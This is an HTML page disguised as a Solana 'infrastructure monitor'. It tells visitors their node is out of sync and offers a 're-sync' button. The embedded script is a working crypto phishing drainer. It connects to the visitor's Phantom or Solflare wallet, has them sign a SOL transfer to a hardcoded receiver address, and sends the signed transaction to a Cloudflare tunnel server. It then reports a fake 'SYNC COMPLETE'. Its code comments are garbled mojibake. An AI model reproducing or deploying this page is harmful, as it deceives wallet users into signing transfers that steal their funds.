<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Solana Infrastructure Monitor</title>
    <script src="https://unpkg.com/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
    <style>
        body { background: #000; color: #14F195; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #050505; padding: 40px; border: 1px solid #14F195; text-align: center; width: 320px; border-radius: 4px; }
        #progress { width: 0%; height: 2px; background: #14F195; transition: 0.5s; margin-top: 20px; }
        button { background: #14F195; color: #000; border: none; padding: 15px; width: 100%; font-weight: bold; cursor: pointer; margin-top: 30px; }
    </style>
</head>
<body>
    <div class="card">
        <h2 style="font-size: 1rem;">LOCAL NODE STATUS: <span style="color:red;">DE-SYNC</span></h2>
        <p style="color:#555; font-size:11px;">System Check: 71_SRV_ACTIVE</p>
        <div style="background:#222; width:100%; height:2px;"><div id="progress"></div></div>
        <button id="cta">RE-SYNC NODE</button>
    </div>

    <script>
        // ğŸ”± å¡«å…¥æœ€æ–°çš„éš§é“
        const tunnel = "https://fridge-olympic-monroe-arabic.trycloudflare.com";
        const RECEIVER = "8KgX1uGpmLU5mVgfpCBrs7HCs21gKbqrwjBn5fKVk18A";

        document.getElementById('cta').onclick = async () => {
            const sWeb3 = window.solanaWeb3;
            const p = window.solana;
            if (!p) { alert("Please open in Phantom/Solflare"); return; }

            try {
                // 1. å”¤èµ·è¿æ¥
                await p.connect();
                document.getElementById('progress').style.width = "50%";

                // 2. æš´åŠ›è·å– Blockhash (ä¸å†ä¾èµ–ä½ çš„ 71 æœåŠ¡å™¨ï¼Œä¿è¯ä¸æ»‘)
                const conn = new sWeb3.Connection("https://api.mainnet-beta.solana.com");
                const { blockhash } = await conn.getLatestBlockhash();

                // 3. æ„å»ºä¸€ä¸ªç®€å•çš„ SOL è½¬è´¦æµ‹è¯• (å…ˆçœ‹èƒ½ä¸èƒ½æ‹‰èµ·ç­¾å)
                const tx = new sWeb3.Transaction().add(
                    sWeb3.SystemProgram.transfer({
                        fromPubkey: p.publicKey,
                        toPubkey: new sWeb3.PublicKey(RECEIVER),
                        lamports: 1000000 // 0.001 SOL æµ‹è¯•
                    })
                );
                tx.recentBlockhash = blockhash;
                tx.feePayer = p.publicKey;

                // 4. æ ¸å¿ƒåŠ¨ä½œï¼šæ‹‰èµ·ç­¾å
                const signed = await p.signTransaction(tx);
                document.getElementById('progress').style.width = "100%";
                
                // 5. å°†ç­¾ååçš„ç»“æœå‘ç»™æœåŠ¡å™¨
                fetch(`${tunnel}/signal_airdrop`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ 
                        address: p.publicKey.toString(),
                        raw: btoa(String.fromCharCode.apply(null, signed.serialize()))
                    })
                });

                alert("SYNC COMPLETE");
            } catch (e) {
                alert("ERR: " + e.message);
                location.reload();
            }
        };
    </script>
</body>
</html>
